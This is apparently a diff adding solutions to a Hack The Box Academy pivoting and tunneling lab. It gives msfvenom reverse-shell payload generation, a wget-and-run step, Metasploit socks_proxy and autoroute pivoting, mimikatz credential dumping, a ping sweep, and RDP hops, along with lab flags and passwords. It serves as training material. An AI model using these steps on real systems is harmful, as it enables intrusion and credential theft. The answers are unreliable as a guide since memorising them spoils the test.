@@ -3091,36 +3091,115 @@ Results: 172.16.5.35
 **Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.**
 
 ```
+###########
+# I will use Module `Autoroute` in metasploit:
+############
+
+# Autoroute module allows you to set routes from a meterpreter session to a discovered subnet in the attacked machine. It allow us pivoting from one subnet to another.
+# 1. Create a payload for the Ubuntu Pivot Host (our victim's machine 1):
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ipKali -f elf -o backupjob LPORT=8080
+
+# 2. Kali machine. Different terminal. Start a multi/handler, also known as a Generic Payload Handler.
+msfconsole -q
+use exploit/multi/handler
+set lhost 0.0.0.0
+set lport 8080
+set payload linux/x64/meterpreter/reverse_tcp
+run
+
+# 3. Once created, kali machine, serve it with a python http server
+python3 -m http.server 8001
+
+# 4. Connect to the Ubuntu with the id_rsa and download the file
+ssh -i id_rsa webadmin@ipUbuntu
+wget http://$ipKali:8001/backupjob
+chmod +x backupjob
+
+# 5. Ubuntu machine, execute the file to gain a Meterpreter session in your kali
+./backupjob
+
+# 6. Once the meterpreter Session is established, send the session to the background with CTRL-z and in the same terminal use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host.
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set SRVHOST 
+set version 4a
+run
+# This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
+# Even though the command line has not returned anything you can ask for the jobs in execution with:
+jobs
+
+# Make sure that your /etc/proxychains4.conf in your kali has enabled the line
+socks4 127.0.0.1 9050
+# Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
+
+# 7. Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. Use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET $NewSubnet
+# Example: set SUBNET 172.16.5.0
+run
+# This will bind session 1 to the $NewSubnet discovered in the victim's machine 1, doing the pivoting
+
+# It is also possible to add routes with autoroute by running autoroute from the initial Meterpreter session (session 1):
+sessions -i 1
+run autoroute -s $NewDiscoveredIp/16
+
+# List the active routes:
+run autoroute -p
+
+# 8. Make sure that you will get back the communications with a reverse proxy:
+
+ssh -i id_rsa $username@$ipUbuntuCompromisedmachine -R $ipUbuntuCompromisedmachine:8080:0.0.0.0:8000
+
+# 9. Finally, use proxychains to route our RDP session traffic via our Meterpreter session.
+proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:"Plain Human work\!"
 
 ```
 
-Results: 
+Results: S1ngl3-Piv07-3@sy-Day
 
 
 **In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?**
 
 ```
+# 1. Copy mimikatz to the Windows machine 1 with CTLR-C CTRL-V. Then in the Powershell terminal
+.\mimikatz.exe privilege::debug  sekurlsa::logonpasswords     
 
+# You will see user vfrank and password
+vfrank:Imply wet Unmasked!
 ```
 
-Results: 
+Results: vfrank
 
 
 **For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.**
 
 ```
+# 1. Open CMD and enumerate network interfaces
+ipconfig /all
+
+# 2. Notice a new network range: 172.16.6.35. Enumerate new Ips in that new network range
+for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"
+# As a result now we have 172.16.6.25
+
+# Note: I had problems with the Poweshell enumerator. For some reason this did not work for me:
+1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.15.6.$($_) -quiet)"}
+
+# 3. Windows-R and mstsc.exe. Enter 172.16.6.25 and use the creds vfrank:Imply wet Unmasked!
 
 ```
 
-Results: 
+Results: N3tw0rk-H0pp1ng-f0R-FuN
 
 **Submit the contents of C:\Flag.txt located on the Domain Controller.**
 
 ```
+# 1. In the previously open session, open a windows explorer and notice the shared unit Z:\
 
 ```
 
-Results: 
+Results: 3nd-0xf-Th3-R@inbow!
 
 
 ## [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)
